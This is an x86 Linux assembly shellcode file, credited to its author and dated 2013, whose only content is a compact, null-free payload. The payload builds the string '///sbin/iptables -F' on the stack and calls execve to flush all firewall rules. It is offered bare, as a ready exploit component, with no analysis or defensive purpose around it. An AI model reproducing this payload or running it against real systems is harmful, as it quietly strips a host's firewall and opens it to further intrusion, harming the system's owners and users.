;Filename  : iptables_flush_shellcode.asm
;Author    : M.Acosta snow <amcx62[_at_]gmail[_dot_]com>
;Date      : 2013 August
;Location  : Lima(Peru)
;Desc	   : iptables flush 
;Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)

global _start			

section .text
_start:

xor eax,eax
push eax
mov word [esp-4],0x462d
sub esp,4
mov esi,esp
push eax
mov dword [esp-4],0x73656c62
mov dword [esp-8],0x61747069 
mov dword [esp-12],0x2f6e6962
mov dword [esp-16],0x732f2f2f
sub esp,16
mov ebx,esp
push eax
push esi
push ebx
mov ecx,esp
mov edx,eax
add al,0xb
int 0x80
